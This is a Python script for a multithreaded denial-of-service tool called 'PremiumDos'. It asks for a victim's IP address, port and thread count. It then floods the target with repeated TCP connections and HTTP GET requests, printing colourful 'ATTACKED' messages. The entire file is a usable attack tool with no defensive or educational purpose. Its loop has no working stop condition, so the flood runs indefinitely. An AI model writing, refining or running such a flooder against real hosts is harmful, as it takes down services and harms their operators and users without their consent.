#//*IMPORTS*//#
import socket
import threading
import os
import ping3
import time
import random
from colorama import init, Fore
import pickle, pyfiglet
#//*DEFINES*//#
rainbow_colors = [
    '\033[31m',  # Red
    '\033[33m',  # Yellow
    '\033[32m',  # Green
    '\033[34m',  # Blue
    '\033[35m',  # Purple
    '\033[36m',  # Cyan
]
init()

lg = Fore.LIGHTGREEN_EX
w = Fore.WHITE
cy = Fore.CYAN
ye = Fore.YELLOW
r = Fore.RED
n = Fore.RESET
colors = [lg, r, w, cy, ye]

def banner():
    f = pyfiglet.Figlet(font='slant')
    banner = f.renderText('PremiumDos')
    print(f'{random.choice(colors)}{banner}{n}')
    print(r+'  Version: 1.02 | Author: Zqyix'+n+'\n')
reset_color = '\033[0m'
def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
#//*END OF DEFINES*//#
#//*END OF IMPORTS*//#
#//*HERE ARE THE INPUTS ALL*//#
clr()
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
banner()
ip = input("Input victim IP: ")
clr()
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
banner()
port = int(input("Input victims port: "))
clr()
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
banner()
trys = int(input("Input number of threads: "))
clr()
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
banner()
print('IP:', ip, 'PORT:', port, 'THREADS:', trys)
inq = input("Are you sure [y/n]: ")
if inq in ["y", "Y"]:
	clr()
	banner()
	def rainbow_text(ping_value):
	    formatted_text = f'\033[31m[zqyix]'
	    formatted_text += random.choice(rainbow_colors) + f'\033[35mATTACKED | PING: {ping_value}'  # Apply random rainbow colors to "ATTACKED PING" and set the ping value to black
	    formatted_text += reset_color
	    return formatted_text
	def get_ping(ip_address):
	    try:
	        # Create a socket to the IP address and port
	        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	        start_time = time.time()
	        s.connect((ip_address, port))
	        end_time = time.time()
	        s.close()
	        ping_time_ms = (end_time - start_time) * 1000  # Calculate ping time in milliseconds
	        return f"{ping_time_ms:.2f} ms"
	    except Exception as e:
	        return f"Failed to ping {ip_address}: {str(e)}"
	
	ip_address = ip
	result = get_ping(ip_address)
	#//*END OF INPUTS*//#
	#//*CODE STARTS HERE*//#
	attack_num = 0
	completed_attacks = 0 
	print_lock = threading.Lock()
	#//*CODE STARTS HERE*//#
	attack_num = 0
	completed_attacks = 0
	print_lock = threading.Lock()
	
	def attack():
	    global attack_num, completed_attacks
	    while True:
	        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	        s.connect((ip, port))
	        request = f"GET / HTTP/1.1\r\nHost: {ip}:{port}\r\n\r\n"
	        s.send(request.encode())
	        resp = s.recv(4096)
	        ping_value = get_ping(ip_address)
	        formatted_text = rainbow_text(f'{ping_value}')
	        print(formatted_text)
	        
	        with print_lock:
	            # Recalculate the ping value for each hit
	            s.close()
	        if attack_num >= trys:
	            completed_attacks += 1
	            if completed_attacks >= trys:
	                break
	
	for i in range(trys):
	    thread = threading.Thread(target=attack)
	    thread.start()
	    print(thread)
	    #DONE#
else:
	clr()
	print('CANCLING DDOSING:', 'IP:', ip, 'PORT:', port, 'THREADS:', trys)
	time.sleep(4.5)
	clr()
	banner()